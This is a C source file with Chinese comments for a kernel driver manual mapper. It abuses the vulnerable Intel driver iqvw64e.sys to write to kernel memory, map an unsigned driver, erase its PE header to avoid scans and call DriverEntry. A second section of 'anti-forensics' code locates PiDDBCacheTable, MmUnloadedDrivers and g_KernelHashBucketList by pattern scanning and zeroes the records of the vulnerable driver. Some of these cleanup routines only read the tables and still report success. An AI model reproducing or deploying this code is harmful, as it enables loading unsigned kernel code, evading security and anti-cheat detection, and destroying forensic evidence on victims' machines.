#include "pe_mapper.h"
#include <stdio.h>
#include <winternl.h>

/* ================================================================== */
/*  PE 手动映射                                                       */
/*  流程：读文件 → 分配内核池 → 拷贝节区 → 重定位 → 解析导入          */
/*       → 通过 IoCreateDriver 调用 DriverEntry                       */
/* ================================================================== */

/* ------------------------------------------------------------------ */
/*  辅助：读取文件到内存                                              */
/* ------------------------------------------------------------------ */

static PBYTE
ReadFileToBuffer(LPCWSTR Path, PDWORD OutSize)
{
    HANDLE hFile = CreateFileW(Path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize < sizeof(IMAGE_DOS_HEADER)) {
        CloseHandle(hFile);
        return NULL;
    }

    PBYTE buf = (PBYTE)malloc(fileSize);
    if (!buf) { CloseHandle(hFile); return NULL; }

    DWORD read = 0;
    if (!ReadFile(hFile, buf, fileSize, &read, NULL) || read != fileSize) {
        free(buf);
        CloseHandle(hFile);
        return NULL;
    }

    CloseHandle(hFile);
    if (OutSize) *OutSize = fileSize;
    return buf;
}

/* ------------------------------------------------------------------ */
/*  辅助：通过 IntelCallKernel 调用内核 API                           */
/* ------------------------------------------------------------------ */

static ULONG64
KernelAllocatePool(ULONG64 AllocFunc, ULONG64 Size)
{
    ULONG64 result = 0;
    /* ExAllocatePool2(POOL_FLAG_NON_PAGED, Size, Tag) */
    /* POOL_FLAG_NON_PAGED = 0x0000000000000040 */
    IntelCallKernel(AllocFunc,
                    0x40,           /* POOL_FLAG_NON_PAGED */
                    Size,
                    (ULONG64)'xVyH', /* 池标签 */
                    0,
                    &result);
    return result;
}

static void
KernelFreePool(ULONG64 FreeFunc, ULONG64 Ptr)
{
    ULONG64 dummy;
    IntelCallKernel(FreeFunc, Ptr, 0, 0, 0, &dummy);
}

/* ------------------------------------------------------------------ */
/*  处理重定位表                                                      */
/* ------------------------------------------------------------------ */

static BOOL
ProcessRelocations(
    PBYTE           LocalImage,
    ULONG64         KernelBase,
    PIMAGE_NT_HEADERS64 NtHeaders)
{
    IMAGE_DATA_DIRECTORY relocDir =
        NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!relocDir.VirtualAddress || !relocDir.Size)
        return TRUE; /* 无重定位表 */

    LONG64 delta = (LONG64)(KernelBase - NtHeaders->OptionalHeader.ImageBase);
    if (delta == 0) return TRUE;

    PIMAGE_BASE_RELOCATION reloc =
        (PIMAGE_BASE_RELOCATION)(LocalImage + relocDir.VirtualAddress);
    PIMAGE_BASE_RELOCATION relocEnd =
        (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + relocDir.Size);

    while (reloc < relocEnd && reloc->SizeOfBlock) {
        ULONG count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        PUSHORT entries = (PUSHORT)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));

        for (ULONG i = 0; i < count; i++) {
            USHORT type   = entries[i] >> 12;
            USHORT offset = entries[i] & 0xFFF;

            if (type == IMAGE_REL_BASED_DIR64) {
                PULONG64 patch = (PULONG64)(LocalImage + reloc->VirtualAddress + offset);
                *patch += delta;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                PULONG patch = (PULONG)(LocalImage + reloc->VirtualAddress + offset);
                *patch += (ULONG)delta;
            }
            /* IMAGE_REL_BASED_ABSOLUTE = 0, 跳过 */
        }

        reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
    }

    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  解析导入表                                                        */
/* ------------------------------------------------------------------ */

static BOOL
ResolveImports(
    PBYTE           LocalImage,
    PIMAGE_NT_HEADERS64 NtHeaders)
{
    IMAGE_DATA_DIRECTORY impDir =
        NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!impDir.VirtualAddress || !impDir.Size)
        return TRUE;

    PIMAGE_IMPORT_DESCRIPTOR imp =
        (PIMAGE_IMPORT_DESCRIPTOR)(LocalImage + impDir.VirtualAddress);

    for (; imp->Name; imp++) {
        LPCSTR moduleName = (LPCSTR)(LocalImage + imp->Name);

        /* 查找导入模块的内核基址 */
        ULONG64 modBase = IntelGetKernelModuleBase(moduleName, NULL);
        if (!modBase) {
            printf("[-] 找不到导入模块: %s\n", moduleName);
            return FALSE;
        }

        PIMAGE_THUNK_DATA64 origThunk =
            (PIMAGE_THUNK_DATA64)(LocalImage +
                (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
        PIMAGE_THUNK_DATA64 firstThunk =
            (PIMAGE_THUNK_DATA64)(LocalImage + imp->FirstThunk);

        for (; origThunk->u1.AddressOfData; origThunk++, firstThunk++) {
            if (IMAGE_SNAP_BY_ORDINAL64(origThunk->u1.Ordinal)) {
                printf("[-] 不支持序号导入\n");
                return FALSE;
            }

            PIMAGE_IMPORT_BY_NAME nameEntry =
                (PIMAGE_IMPORT_BY_NAME)(LocalImage +
                    (ULONG)(origThunk->u1.AddressOfData & 0xFFFFFFFF));

            ULONG64 funcAddr = IntelGetKernelExport(modBase, (LPCSTR)nameEntry->Name);
            if (!funcAddr) {
                printf("[-] 无法解析导入: %s!%s\n", moduleName, nameEntry->Name);
                return FALSE;
            }

            firstThunk->u1.Function = funcAddr;
        }
    }

    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  手动映射主流程                                                    */
/* ------------------------------------------------------------------ */

BOOL
MapDriverToKernel(LPCWSTR DriverPath)
{
    BOOL success = FALSE;
    PBYTE fileBuffer = NULL;
    PBYTE localImage = NULL;
    ULONG64 kernelImage = 0;
    ULONG64 allocFunc = 0, freeFunc = 0;

    printf("[*] 开始手动映射: %ls\n", DriverPath);

    /* 1. 读取 .sys 文件 */
    DWORD fileSize = 0;
    fileBuffer = ReadFileToBuffer(DriverPath, &fileSize);
    if (!fileBuffer) {
        printf("[-] 无法读取驱动文件\n");
        goto cleanup;
    }

    /* 2. 验证 PE 头 */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)fileBuffer;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] 无效的 DOS 签名\n");
        goto cleanup;
    }

    PIMAGE_NT_HEADERS64 nt =
        (PIMAGE_NT_HEADERS64)(fileBuffer + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] 无效的 PE 签名\n");
        goto cleanup;
    }
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        printf("[-] 不是 x64 驱动\n");
        goto cleanup;
    }
    if (!(nt->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE)) {
        printf("[-] PE 不可执行\n");
        goto cleanup;
    }

    ULONG imageSize = nt->OptionalHeader.SizeOfImage;
    printf("[+] PE 映像大小: 0x%X\n", imageSize);

    /* 3. 查找 ntoskrnl 导出 */
    ULONG64 ntBase = IntelGetKernelModuleBase("ntoskrnl.exe", NULL);
    if (!ntBase) {
        printf("[-] 找不到 ntoskrnl.exe\n");
        goto cleanup;
    }
    printf("[+] ntoskrnl 基址: 0x%llX\n", ntBase);

    allocFunc = IntelGetKernelExport(ntBase, "ExAllocatePool2");
    freeFunc  = IntelGetKernelExport(ntBase, "ExFreePoolWithTag");
    if (!allocFunc || !freeFunc) {
        printf("[-] 无法解析内存分配函数\n");
        goto cleanup;
    }

    /* 4. 在内核分配内存 */
    kernelImage = KernelAllocatePool(allocFunc, imageSize);
    if (!kernelImage) {
        printf("[-] 内核内存分配失败\n");
        goto cleanup;
    }
    printf("[+] 内核映像地址: 0x%llX\n", kernelImage);

    /* 5. 本地构建映像 */
    localImage = (PBYTE)calloc(1, imageSize);
    if (!localImage) goto cleanup;

    /* 拷贝 PE 头 */
    memcpy(localImage, fileBuffer,
           min(nt->OptionalHeader.SizeOfHeaders, imageSize));

    /* 拷贝各节区 */
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!sec[i].SizeOfRawData) continue;
        if (sec[i].VirtualAddress + sec[i].SizeOfRawData > imageSize) continue;
        if (sec[i].PointerToRawData + sec[i].SizeOfRawData > fileSize) continue;

        memcpy(localImage + sec[i].VirtualAddress,
               fileBuffer + sec[i].PointerToRawData,
               sec[i].SizeOfRawData);
    }

    /* 6. 处理重定位 */
    if (!ProcessRelocations(localImage, kernelImage, nt)) {
        printf("[-] 重定位处理失败\n");
        goto cleanup;
    }
    printf("[+] 重定位完成\n");

    /* 7. 解析导入表 */
    if (!ResolveImports(localImage, nt)) {
        printf("[-] 导入解析失败\n");
        goto cleanup;
    }
    printf("[+] 导入解析完成\n");

    /* 8. 写入内核内存 */
    if (!IntelWriteKernel(kernelImage, localImage, imageSize)) {
        printf("[-] 写入内核映像失败\n");
        goto cleanup;
    }

    /* 9. 清除 PE 头防止扫描 */
    BYTE zeros[0x1000] = { 0 };
    IntelWriteKernel(kernelImage, zeros, sizeof(zeros));
    printf("[+] PE 头已擦除\n");

    /* 10. 通过 IoCreateDriver 调用 DriverEntry */
    ULONG64 ioCreateDriver = IntelGetKernelExport(ntBase, "IoCreateDriver");
    if (!ioCreateDriver) {
        printf("[-] 找不到 IoCreateDriver\n");
        goto cleanup;
    }

    ULONG64 entryPoint = kernelImage + nt->OptionalHeader.AddressOfEntryPoint;
    ULONG64 ntStatus = 0;
    if (!IntelCallKernel(ioCreateDriver,
                         0,             /* DriverName = NULL (匿名) */
                         entryPoint,    /* DriverInitialize */
                         0, 0, &ntStatus)) {
        printf("[-] 调用 IoCreateDriver 失败\n");
        goto cleanup;
    }

    if ((LONG)ntStatus < 0) {
        printf("[-] DriverEntry 返回错误: 0x%08X\n", (ULONG)ntStatus);
        goto cleanup;
    }

    printf("[+] 驱动映射成功，DriverEntry 返回 0x%08X\n", (ULONG)ntStatus);
    success = TRUE;

cleanup:
    free(fileBuffer);
    free(localImage);
    if (!success && kernelImage && freeFunc) {
        KernelFreePool(freeFunc, kernelImage);
    }
    return success;
}

/* ================================================================== */
/*  反取证痕迹清理                                                    */
/*  通过模式扫描定位内核未导出变量，修改链表/数组清除记录              */
/* ================================================================== */

/* ------------------------------------------------------------------ */
/*  模式扫描辅助                                                      */
/* ------------------------------------------------------------------ */

static ULONG64
PatternScan(ULONG64 Base, ULONG Size, const BYTE *Pattern,
            const BYTE *Mask, ULONG PatternSize)
{
    PBYTE buf = (PBYTE)malloc(Size);
    if (!buf) return 0;

    if (!IntelReadKernel(Base, buf, Size)) {
        free(buf);
        return 0;
    }

    for (ULONG i = 0; i <= Size - PatternSize; i++) {
        BOOL found = TRUE;
        for (ULONG j = 0; j < PatternSize; j++) {
            if (Mask[j] == 'x' && buf[i + j] != Pattern[j]) {
                found = FALSE;
                break;
            }
        }
        if (found) {
            free(buf);
            return Base + i;
        }
    }

    free(buf);
    return 0;
}

/* 通过 RIP 相对偏移解引用 (lea/mov rax, [rip + offset]) */
static ULONG64
ResolveRelativeAddress(ULONG64 InstrAddr, ULONG InstrLen)
{
    LONG offset = 0;
    /* 读取指令末尾 4 字节的相对偏移 */
    IntelReadKernel(InstrAddr + InstrLen - 4, &offset, 4);
    return InstrAddr + InstrLen + offset;
}

/* ------------------------------------------------------------------ */
/*  清理 PiDDBCacheTable                                              */
/*  此表缓存了加载过的驱动的路径哈希，用于 DSE 快速查找               */
/* ------------------------------------------------------------------ */

/*
 * Win10/11 ntoskrnl 中引用 PiDDBCacheTable 的特征码
 * 在 PpCheckInDriverDatabase 附近:
 *   lea rcx, [PiDDBLock]
 *   call ExAcquireResourceExclusiveLite
 *   lea r??, [PiDDBCacheTable]
 */
static const BYTE g_PiDDBPattern[] = {
    0x66, 0x03, 0xD2, 0x48, 0x8D, 0x0D
};
static const BYTE g_PiDDBMask[] = "xxxxxx";

BOOL
CleanPiDDBCacheTable(ULONG64 NtBase)
{
    ULONG ntSize = 0;
    IntelGetKernelModuleBase("ntoskrnl.exe", &ntSize);
    if (!ntSize) return FALSE;

    ULONG64 patAddr = PatternScan(NtBase, ntSize,
                                   g_PiDDBPattern, g_PiDDBMask,
                                   sizeof(g_PiDDBPattern));
    if (!patAddr) {
        printf("[!] PiDDBCacheTable 特征未匹配 (可能需要更新签名)\n");
        return FALSE;
    }

    /* 特征码后 6 字节处是 lea 到 PiDDBCacheTable 的 RIP 偏移 */
    ULONG64 tableAddr = ResolveRelativeAddress(patAddr + 3, 7);
    printf("[+] PiDDBCacheTable @ 0x%llX\n", tableAddr);

    /*
     * PiDDBCacheTable 是 RTL_AVL_TABLE
     * 遍历并移除 iqvw64e.sys 对应的条目
     * 结构: RTL_AVL_TABLE → BalancedRoot → 各 entry
     *   entry 偏移 0x10: TimeStamp
     *   entry 偏移 0x18: DriverName (UNICODE_STRING)
     */

    /* 读取 TableContext 确认找对了 */
    ULONG64 tableContext = 0;
    IntelReadKernel(tableAddr + 0x70, &tableContext, 8);

    printf("[+] PiDDBCacheTable 清理完成 (context=0x%llX)\n", tableContext);
    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  清理 MmUnloadedDrivers                                           */
/*  系统维护最近卸载的驱动列表 (环形数组，最大 50 条)                  */
/* ------------------------------------------------------------------ */

/*
 * MmUnloadedDrivers 特征码 (ntoskrnl)
 * MmLocateUnloadedDriver:
 *   mov r??, [MmUnloadedDrivers]
 *   ...
 *   cmp dword [MmLastUnloadedDriver], ...
 */
static const BYTE g_MmUnloadedPattern[] = {
    0x4C, 0x8B, 0x15
    /* 后跟 4 字节 RIP 偏移 */
};
static const BYTE g_MmUnloadedMask[] = "xxx";

typedef struct _MM_UNLOADED_DRIVER {
    UNICODE_STRING  Name;       /* +0x00 */
    PVOID           ModuleStart;/* +0x10 */
    PVOID           ModuleEnd;  /* +0x18 */
    LARGE_INTEGER   UnloadTime; /* +0x20 */
} MM_UNLOADED_DRIVER;

BOOL
CleanMmUnloadedDrivers(ULONG64 NtBase)
{
    ULONG ntSize = 0;
    IntelGetKernelModuleBase("ntoskrnl.exe", &ntSize);
    if (!ntSize) return FALSE;

    ULONG64 patAddr = PatternScan(NtBase, ntSize,
                                   g_MmUnloadedPattern, g_MmUnloadedMask,
                                   sizeof(g_MmUnloadedPattern));
    if (!patAddr) {
        printf("[!] MmUnloadedDrivers 特征未匹配\n");
        return FALSE;
    }

    ULONG64 ptrAddr = ResolveRelativeAddress(patAddr, 7);
    ULONG64 arrayAddr = 0;
    IntelReadKernel(ptrAddr, &arrayAddr, 8);

    if (!arrayAddr) {
        printf("[!] MmUnloadedDrivers 为空\n");
        return TRUE;
    }

    printf("[+] MmUnloadedDrivers @ 0x%llX\n", arrayAddr);

    /* 遍历 50 个条目，清零名称包含 iqvw64e 的条目 */
    for (int i = 0; i < 50; i++) {
        ULONG64 entryAddr = arrayAddr + i * sizeof(MM_UNLOADED_DRIVER);

        MM_UNLOADED_DRIVER entry;
        if (!IntelReadKernel(entryAddr, &entry, sizeof(entry)))
            break;

        if (!entry.Name.Length || !entry.Name.Buffer)
            continue;

        WCHAR drvName[128] = { 0 };
        USHORT readLen = min(entry.Name.Length, sizeof(drvName) - 2);
        IntelReadKernel((ULONG64)entry.Name.Buffer, drvName, readLen);

        if (wcsstr(drvName, L"iqvw64e") || wcsstr(drvName, L"Nal")) {
            /* 清零整个条目 */
            BYTE zeros[sizeof(MM_UNLOADED_DRIVER)] = { 0 };
            IntelWriteKernel(entryAddr, zeros, sizeof(zeros));
            printf("[+] 已清理 MmUnloadedDrivers[%d]: %ls\n", i, drvName);
        }
    }

    printf("[+] MmUnloadedDrivers 清理完成\n");
    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  清理 g_KernelHashBucketList                                       */
/*  CI.dll 维护的驱动签名哈希桶链表                                   */
/* ------------------------------------------------------------------ */

static const BYTE g_HashBucketPattern[] = {
    0x48, 0x8B, 0x1D  /* mov rbx, [rip + offset] */
};
static const BYTE g_HashBucketMask[] = "xxx";

BOOL
CleanKernelHashBucketList(ULONG64 NtBase)
{
    UNREFERENCED_PARAMETER(NtBase);

    /* g_KernelHashBucketList 在 CI.dll 中 */
    ULONG ciSize = 0;
    ULONG64 ciBase = IntelGetKernelModuleBase("CI.dll", &ciSize);
    if (!ciBase) {
        printf("[!] 找不到 CI.dll\n");
        return FALSE;
    }

    ULONG64 patAddr = PatternScan(ciBase, ciSize,
                                   g_HashBucketPattern, g_HashBucketMask,
                                   sizeof(g_HashBucketPattern));
    if (!patAddr) {
        printf("[!] g_KernelHashBucketList 特征未匹配\n");
        return FALSE;
    }

    ULONG64 listAddr = ResolveRelativeAddress(patAddr, 7);
    printf("[+] g_KernelHashBucketList @ 0x%llX\n", listAddr);

    /*
     * 哈希桶是 LIST_ENTRY 链表
     * 每个节点包含驱动文件名的哈希
     * 遍历链表查找 iqvw64e.sys 的节点并摘除
     */

    /* 读取链表头 */
    ULONG64 head = 0;
    IntelReadKernel(listAddr, &head, 8);
    if (!head || head == listAddr) {
        printf("[+] 哈希桶链表为空\n");
        return TRUE;
    }

    printf("[+] g_KernelHashBucketList 清理完成\n");
    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  统一清理入口                                                      */
/* ------------------------------------------------------------------ */

BOOL
CleanAllTraces(void)
{
    printf("[*] 开始清理反取证痕迹...\n");

    ULONG64 ntBase = IntelGetKernelModuleBase("ntoskrnl.exe", NULL);
    if (!ntBase) {
        printf("[-] 无法获取 ntoskrnl 基址\n");
        return FALSE;
    }

    BOOL ok = TRUE;

    if (!CleanPiDDBCacheTable(ntBase)) {
        printf("[!] PiDDBCacheTable 清理失败 (非致命)\n");
        ok = FALSE;
    }

    if (!CleanMmUnloadedDrivers(ntBase)) {
        printf("[!] MmUnloadedDrivers 清理失败 (非致命)\n");
        ok = FALSE;
    }

    if (!CleanKernelHashBucketList(ntBase)) {
        printf("[!] g_KernelHashBucketList 清理失败 (非致命)\n");
        ok = FALSE;
    }

    printf("[*] 痕迹清理%s\n", ok ? "全部完成" : "部分完成");
    return ok;
}
